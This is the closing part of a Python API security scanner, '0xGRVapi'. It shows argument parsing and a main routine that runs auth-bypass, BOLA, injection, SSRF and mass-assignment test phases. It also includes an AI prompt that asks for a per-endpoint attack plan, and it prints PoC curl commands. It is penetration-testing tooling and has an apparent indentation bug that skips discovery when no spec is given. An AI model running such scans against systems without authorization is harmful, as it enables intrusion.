    console.print(f"  [bold white]scan complete[/bold white]  [dim]{elapsed:.0f}s[/dim]")
    console.print(f"  [dim]report  [/dim] {report_f}")
    console.print(f"  [dim]output  [/dim] {D.root}")
    console.print(f"  [dim]{'─'*52}[/dim]")
    console.print()

# MAIN
async def main():
    ap = argparse.ArgumentParser(
        description="0xGRVapi — Elite API Security Reconnaissance by 0xgrv",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 EXAMPLES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # Basic scan
  python3 0xgrvapi.py -u https://api.target.com

  # With auth token
  python3 0xgrvapi.py -u https://api.target.com --token eyJhbGci...

  # With API key header
  python3 0xgrvapi.py -u https://api.target.com --api-key YOUR_KEY

  # With AI analysis + Telegram notifications
  python3 0xgrvapi.py -u https://api.target.com \\
    --ai-key sk-ant-XXX \\
    --tg-token 123456:ABC-DEF \\
    --tg-chat -100123456

  # Custom output dir
  python3 0xgrvapi.py -u https://api.target.com -o ~/recon

  # Skip phases
  python3 0xgrvapi.py -u https://api.target.com --skip-injection --skip-ssrf

  # Custom extra headers  
  python3 0xgrvapi.py -u https://api.target.com \\
    --headers "X-Custom: value" "X-Other: value2"

  # From config file
  python3 api_recon.py --config targets.yaml
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ENV VARS (alternative to flags)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ANTHROPIC_API_KEY   — Claude AI key
  TG_BOT_TOKEN        — Telegram bot token
  TG_CHAT_ID          — Telegram chat ID
  API_TOKEN           — Bearer token
  API_KEY             — API key
        """
    )

    ap.add_argument("-u", "--url",      default=None, help="Target API base URL")
    ap.add_argument("-o", "--output",   default=".",    help="Output directory (default: .)")
    ap.add_argument("--token",          default=None,   help="Bearer token for authentication")
    ap.add_argument("--api-key",        default=None,   help="API key (X-API-Key header)")
    ap.add_argument("--headers",        nargs="+",      help='Extra headers: "Name: Value"')
    ap.add_argument("--ai-key",         default=None,   help="Anthropic API key for AI analysis")
    ap.add_argument("--ai-provider",    default="anthropic",
                    choices=["anthropic","openai","gemini"],
                    help="AI provider: anthropic / openai / gemini  (default: anthropic)")
    ap.add_argument("--ai-model",       default="",
                    help="Model override (e.g. gpt-4o, gemini-1.5-pro, claude-sonnet-4-6)")
    ap.add_argument("--tg-token",       default=None,   help="Telegram bot token")
    ap.add_argument("--tg-chat",        default=None,   help="Telegram chat ID")
    ap.add_argument("--config",         default=None,   help="YAML config file")
    ap.add_argument("--timeout",        type=int, default=15, help="Request timeout in seconds")
    ap.add_argument("--skip-injection", action="store_true", help="Skip injection tests")
    ap.add_argument("--skip-ssrf",      action="store_true", help="Skip SSRF tests")
    ap.add_argument("--skip-mass",      action="store_true", help="Skip mass assignment")
    ap.add_argument("--skip-fuzz",      action="store_true", help="Skip business logic fuzz")
    ap.add_argument("--passive",        action="store_true", help="Discovery only (no active tests)")
    ap.add_argument("--no-prompt",      action="store_true", help="Skip report name prompt — use auto-generated name")
    ap.add_argument("--paths",          default=None, metavar="FILE",
                    help="File with extra endpoint paths to fuzz (one per line)")
    ap.add_argument("--wordlist",       default=None, metavar="FILE",
                    help="Alias for --paths")
    ap.add_argument("--spec",           default=None, metavar="FILE",
                    help="Local OpenAPI/Swagger spec file (.json or .yaml) to import endpoints from")
    ap.add_argument("--refresh-config", default=None, metavar="FILE",
                    help="Standalone token refresh config file (token_refresh.yaml)")
    ap.add_argument("--refresh-url",    default=None,
                    help="Token refresh endpoint URL (enables auto token refresh)")
    ap.add_argument("--refresh-grant",  default="client_credentials",
                    choices=["client_credentials","password","refresh_token","custom_script"],
                    help="OAuth2 grant type for token refresh (default: client_credentials)")
    ap.add_argument("--refresh-id",     default=None, help="client_id for token refresh")
    ap.add_argument("--refresh-secret", default=None, help="client_secret for token refresh")
    ap.add_argument("--refresh-basic",  default=None,
                    help="Pre-built Basic auth header value for token refresh (e.g. 'Basic dGV...')")
    args = ap.parse_args()

    # Load config file
    if args.config:
        try:
            cfg = yaml.safe_load(Path(args.config).read_text())
            if not args.url:        args.url      = cfg.get("url")
            if not args.token:      args.token    = cfg.get("token")
            if not args.api_key:    args.api_key  = cfg.get("api_key")
            if not args.ai_key:      args.ai_key      = cfg.get("ai_key")
            if not getattr(args,"ai_provider",None) or args.ai_provider == "anthropic":
                args.ai_provider = cfg.get("ai_provider", "anthropic")
            if not getattr(args,"ai_model",""):
                args.ai_model    = cfg.get("ai_model", "")
            if not args.tg_token:   args.tg_token = cfg.get("tg_token")
            if not args.tg_chat:    args.tg_chat  = cfg.get("tg_chat")
            if not args.headers:    args.headers  = cfg.get("headers")
            # spec file from config
            if not getattr(args, "spec", None):
                args.spec = cfg.get("spec")
            # token_refresh block from config
            if cfg.get("token_refresh"):
                args._refresh_cfg = cfg["token_refresh"]
        except Exception as ex:
            console.print(f"[red]Config error: {ex}[/red]")
            sys.exit(1)

    args.ai_key   = args.ai_key   or os.environ.get("ANTHROPIC_API_KEY")
    args.tg_token = args.tg_token or os.environ.get("TG_BOT_TOKEN")
    args.tg_chat  = args.tg_chat  or os.environ.get("TG_CHAT_ID")
    args.token    = args.token    or os.environ.get("API_TOKEN")
    args.api_key  = args.api_key  or os.environ.get("API_KEY")

    if not args.url:
        console.print("[red]Error: provide --url <target> or use --config file[/red]")
        ap.print_help()
        sys.exit(1)

    if not args.url.startswith("http"):
        args.url = "https://" + args.url
    args.url = args.url.rstrip("/")

    extra_headers = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                extra_headers[k.strip()] = v.strip()

    # Banner — ASCII art is the identity of the tool, keeping it
    console.print()
    console.print("  [bold cyan] ██████╗ ██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ ██╗[/bold cyan]")
    console.print("  [bold cyan]██╔═████╗╚██╗██╔╝██╔════╝ ██╔══██╗██║   ██║██╔══██╗██╔══██╗██║[/bold cyan]")
    console.print("  [bold cyan]██║██╔██║ ╚███╔╝ ██║  ███╗██████╔╝██║   ██║███████║██████╔╝██║[/bold cyan]")
    console.print("  [bold cyan]████╔╝██║ ██╔██╗ ██║   ██║██╔══██╗╚██╗ ██╔╝██╔══██║██╔═══╝ ██║[/bold cyan]")
    console.print("  [bold cyan]╚██████╔╝██╔╝ ██╗╚██████╔╝██║  ██║ ╚████╔╝ ██║  ██║██║     ██║[/bold cyan]")
    console.print("  [bold cyan] ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝[/bold cyan]")
    console.print()
    console.print(f"  [bold white]0xGRVapi[/bold white]  [dim]v{VERSION}  —  API Security Reconnaissance[/dim]")
    console.print("  [dim]BOLA · Auth Bypass · Injections · SSRF · Mass Assignment · AI Triage[/dim]")
    console.print("  [dim]by 0xgrv  ·  github.com/0xgrv[/dim]")
    console.print(f"  [dim]{'─'*64}[/dim]")

    _spec_f    = getattr(args, "spec", None)
    _ref_cfg   = getattr(args, "_refresh_cfg", {}) or {}
    _ref_url   = getattr(args, "refresh_url", None) or _ref_cfg.get("url", "")
    console.print()
    console.print(f"  [bold cyan]target[/bold cyan]   {args.url}")
    _auth_str = "[green]bearer token[/green]" if args.token else "[green]api key[/green]" if args.api_key else "[dim]none[/dim]"
    _spec_str = f"[green]{Path(_spec_f).name}[/green]" if _spec_f else "[dim]auto-detect[/dim]"
    _ai_str   = f"[green]{args.ai_provider}[/green] [dim]({args.ai_model or 'default'})[/dim]" if args.ai_key else "[dim]disabled[/dim]"
    _ref_str  = f"[green]{_ref_cfg.get('grant_type','on')}[/green]" if _ref_url else "[dim]disabled[/dim]"
    console.print(f"  [bold cyan]auth[/bold cyan]     {_auth_str}")
    console.print(f"  [bold cyan]spec[/bold cyan]     {_spec_str}")
    console.print(f"  [bold cyan]ai[/bold cyan]       {_ai_str}")
    console.print(f"  [bold cyan]refresh[/bold cyan]  {_ref_str}")
    console.print(f"  [bold cyan]telegram[/bold cyan] {'[green]on[/green]' if args.tg_token else '[dim]off[/dim]'}")
    console.print(f"  [dim]{'─'*64}[/dim]")
    console.print("  [yellow]confirm you have written authorization to test this target[/yellow]")
    console.print("  [dim]Ctrl+C to abort[/dim]")
    console.print()

    try:
        for i in range(3, 0, -1):
            console.print(f"  [dim]starting in {i}[/dim]", end="\r")
            await asyncio.sleep(1)
        console.print()
    except KeyboardInterrupt:
        console.print("  [dim]aborted[/dim]")
        sys.exit(0)

    # Setup — Reports/ folder + optional custom name
    auto_name = re.sub(r'[^a-zA-Z0-9._-]', '_', args.url.split("://")[-1].split("/")[0])
    ts_suffix = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_folder = f"{auto_name}_{ts_suffix}"

    # Ask user for custom report name (unless --output was explicitly set or --no-prompt)
    report_name = default_folder
    if not getattr(args, "no_prompt", False):
        console.print(f"\n  [bold cyan]Report folder name[/bold cyan]")
        console.print(f"  Default: [yellow]{default_folder}[/yellow]")
        try:
            user_input = input("  Custom name (Enter to use default): ").strip()
            if user_input:
                report_name = re.sub(r'[^a-zA-Z0-9._-]', '_', user_input)
                console.print(f"  Using: [green]{report_name}[/green]")
            else:
                console.print(f"  Using default: [green]{report_name}[/green]")
        except (EOFError, KeyboardInterrupt):
            pass  # non-interactive — use default

    reports_base = Path(args.output) / "Reports"
    reports_base.mkdir(parents=True, exist_ok=True)
    D     = OutputDirs(report_name, str(reports_base)).create()
    stats: Dict = {}
    tg    = TelegramNotifier(args.tg_token or "", args.tg_chat or "")
    start = time.time()

    console.print(f"\n  [cyan]▸ Output folder: {D.root}[/cyan]\n")

    await tg.send_start(
        args.url,
        spec_file=getattr(args, "spec", None),
        phases=["Discovery","Auth","BOLA","Rate Limit","Injection",
                "Mass Assign","SSRF","Headers","Info Leak","Business Logic","AI"])

    all_findings: List[Dict] = []

    # Priority: --refresh-config file > main config token_refresh block > CLI flags
    refresh_cfg = getattr(args, "_refresh_cfg", {}) or {}

    # Load standalone --refresh-config file if provided
    rc_file = getattr(args, "refresh_config", None)
    if rc_file:
        try:
            rc_path = Path(rc_file)
            if not rc_path.exists():
                console.print(f"[red]Refresh config not found: {rc_file}[/red]")
                sys.exit(1)
            rc_data = yaml.safe_load(rc_path.read_text())
            # File can be either the block directly or wrapped in a key
            if "token_refresh" in rc_data:
                refresh_cfg = rc_data["token_refresh"]
            else:
                refresh_cfg = rc_data
            ok(f"Loaded refresh config: {rc_path.name} ({refresh_cfg.get('grant_type','client_credentials')})")
        except Exception as ex:
            console.print(f"[red]Refresh config error: {ex}[/red]")
            sys.exit(1)

    if getattr(args, "refresh_url", None):
        refresh_cfg.setdefault("url",          args.refresh_url)
        refresh_cfg.setdefault("grant_type",   args.refresh_grant)
        if getattr(args, "refresh_id", None):
            refresh_cfg["client_id"]     = args.refresh_id
        if getattr(args, "refresh_secret", None):
            refresh_cfg["client_secret"] = args.refresh_secret
        if getattr(args, "refresh_basic", None):
            refresh_cfg["basic_auth"]    = args.refresh_basic

    refresher = TokenRefresher(refresh_cfg) if refresh_cfg.get("url") else None
    if refresher:
        ok(f"Auto token refresh enabled ({refresh_cfg.get('grant_type','client_credentials')})")

    try:
        async with APIClient(args.url, args.token, args.api_key,
                             extra_headers, args.timeout, refresher) as client:
            # Load custom paths if provided
            paths_file = getattr(args, "paths", None) or getattr(args, "wordlist", None)
            if paths_file:
                try:
                    custom = [l.strip() for l in open(paths_file)
                              if l.strip() and not l.startswith("#")]
                    added = [p for p in custom if p not in API_PATHS]
                    API_PATHS.extend(added)
                    ok(f"Loaded {len(added)} custom paths from {paths_file}")
                except Exception as ex:
                    warn(f"Could not load custom paths: {ex}")

            # ── Pre-scan AI spec analysis ─────────────────────────────────────
            # If we have a spec AND an AI key, do a quick pre-scan analysis.
            # The AI reads the spec structure and tells us per-endpoint which
            # attack vectors are most likely to yield results. This output gets
            # stored in stats so later phases can reference it, and it's also
            # saved to disk so you can read it before the scan finishes.
            spec_file = getattr(args, "spec", None)
            if spec_file and args.ai_key and Path(spec_file).exists():
                try:
                    inf("Running pre-scan AI spec analysis...")
                    spec_raw = Path(spec_file).read_text(encoding="utf-8")[:12000]
                    prescan_prompt = f"""You are an API penetration tester. I'm about to run an automated security scan against this API.

Target: {args.url}
Spec file: {spec_file}

== OPENAPI SPEC ==
{spec_raw}

Analyze the spec and give me a pre-scan attack plan. Be specific, technical, and brief.

## 1. HIGH-VALUE ENDPOINTS
List the 5 most interesting endpoints for security testing and exactly why (auth patterns, ID types, write operations, data sensitivity).

## 2. ATTACK VECTOR PRIORITY (per endpoint)
For each endpoint above, what is the most likely vulnerability class and why:
- BOLA/IDOR (if UUID path params — note that UUID-based BOLA needs real UUIDs, not numeric)
- Auth bypass (if no auth or optional auth)
- Injection (which fields, which injection type)
- Mass assignment (which fields look privilege-related)
- Info leakage (which responses might expose sensitive data)
- Business logic (what operations could be abused)

## 3. UUID PARAMS — BOLA STRATEGY
This spec uses UUID path params (tenantId, terminalId etc).
List which endpoints have cross-tenant BOLA potential and what a real test would look like
(i.e. get UUID for tenant A, use it in requests authenticated as tenant B).

## 4. SPEC OBSERVATIONS
Any security issues visible just from reading the spec:
- Endpoints with no auth requirement that should have it
- Dangerous operations (DELETE, mass update) with weak access control
- Fields that suggest privilege escalation (logLevel, sinkType, role etc)
- Internal endpoints that shouldn't be externally accessible

## 5. MANUAL TEST PRIORITY
Top 3 things to test manually after the automated scan, specific to this API.

Be concise. No generic advice. Everything must reference specific endpoints or fields from the spec above."""

                    prescan_analysis = await _call_ai(
                        args.ai_key, args.ai_provider,
                        args.ai_model or "", prescan_prompt
                    )
                    prescan_path = D.report / "AI_PRESCAN.md"
                    prescan_path.write_text(
                        f"# Pre-Scan AI Analysis\n"
                        f"# Target  : {args.url}\n"
                        f"# Spec    : {spec_file}\n"
                        f"# Provider: {args.ai_provider}\n"
                        f"# Generated: {datetime.now().isoformat()}\n\n"
                        f"{prescan_analysis}"
                    )
                    stats["prescan_analysis"] = prescan_analysis[:2000]  # store summary for final AI
                    ok(f"Pre-scan analysis saved → {prescan_path}")
                    # Print the high-value endpoints section to terminal
                    lines = prescan_analysis.split("\n")
                    in_section = False
                    for line in lines[:40]:
                        if "HIGH-VALUE ENDPOINTS" in line or "ATTACK VECTOR" in line:
                            in_section = True
                        if in_section:
                            console.print(f"  [dim]{line}[/dim]")
                        if in_section and line.strip() == "" and lines.index(line) > 5:
                            break
                except Exception as ex:
                    warn(f"Pre-scan AI failed: {ex}")

                live_paths = await phase_discovery(args.url, D, client, tg, stats,
                                               local_spec=spec_file)

            if not args.passive:
                # Phase 2 — Auth
                auth_f = await phase_auth(args.url, D, client, live_paths, tg, stats)
                all_findings.extend(auth_f)

                # Phase 3 — Authz / BOLA
                authz_f = await phase_authz(args.url, D, client, live_paths, tg, stats)
                all_findings.extend(authz_f)

                # Phase 4 — Rate limiting
                rl_f = await phase_rate_limit(args.url, D, client, live_paths, tg, stats)
                all_findings.extend(rl_f)

                # Phase 5 — Injection
                if not args.skip_injection:
                    inj_f = await phase_injection(args.url, D, client, live_paths, tg, stats)
                    all_findings.extend(inj_f)

                # Phase 6 — Mass assignment
                if not args.skip_mass:
                    ma_f = await phase_mass_assignment(args.url, D, client, live_paths, tg, stats)
                    all_findings.extend(ma_f)

                # Phase 7 — SSRF
                if not args.skip_ssrf:
                    ssrf_f = await phase_ssrf(args.url, D, client, live_paths, tg, stats)
                    all_findings.extend(ssrf_f)

                # Phase 8 — Headers / CORS
                hdr_f = await phase_headers(args.url, D, client, live_paths, tg, stats)
                all_findings.extend(hdr_f)

                # Phase 9 — Info leak
                leak_f = await phase_info_leak_fixed(args.url, D, client, live_paths, tg, stats)
                all_findings.extend(leak_f)

                # Phase 10 — Business logic
                if not args.skip_fuzz:
                    bl_f = await phase_business_logic(args.url, D, client, live_paths, tg, stats)
                    all_findings.extend(bl_f)

                # Phase 10b — Nikto (if installed, credits: sullo/nikto)
                if not getattr(args, "skip_nikto", False):
                    nk_f = await phase_nikto(args.url, D, stats)
                    all_findings.extend(nk_f)

            # Phase 11 — AI
            await phase_ai(args.url, D, all_findings, stats, args.ai_key, tg,
                           ai_provider=getattr(args,"ai_provider","anthropic"),
                           ai_model=getattr(args,"ai_model",""))

    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted — saving partial results...[/yellow]")

    # Enrich all findings with PoC curl + OWASP + remediation
    enriched_findings = []
    for f in all_findings:
        if not f.get("owasp"):
            f = enrich_finding(f)
        enriched_findings.append(f)
    all_findings = enriched_findings

    # Print PoC summary to terminal for CRITICAL/HIGH findings
    crit_high = [f for f in all_findings if f.get("sev") in ["CRITICAL","HIGH"]]
    if crit_high:
        console.print()
        console.print(f"  [bold red]━━━ PoC COMMANDS — {len(crit_high)} CRITICAL/HIGH FINDINGS ━━━[/bold red]")
        for i, f in enumerate(crit_high[:10], 1):
            sev_color = "red" if f.get("sev") == "CRITICAL" else "yellow"
            console.print(f"\n  [{sev_color}][{i}] {f.get('type','')}[/{sev_color}]")
            console.print(f"  [dim]{f.get('detail','')[:120]}[/dim]")
            if f.get("poc_curl"):
                console.print(f"  [green]$ {f['poc_curl'][:200]}[/green]")
        if len(crit_high) > 10:
            console.print(f"\n  [dim]... and {len(crit_high)-10} more in the HTML report[/dim]")
        console.print()

    # Generate report
    sjson(D.report / "all_findings.json", all_findings)
    sjson(D.report / "stats.json", stats)
    report_f = generate_report(args.url, D, stats, all_findings)

    elapsed = time.time() - start
    print_summary(args.url, D, stats, all_findings, report_f, elapsed)

    # Final Telegram message + HTML report file
    await tg.send_final(stats, args.url, all_findings, str(report_f), elapsed)

if __name__ == "__main__":
    asyncio.run(main())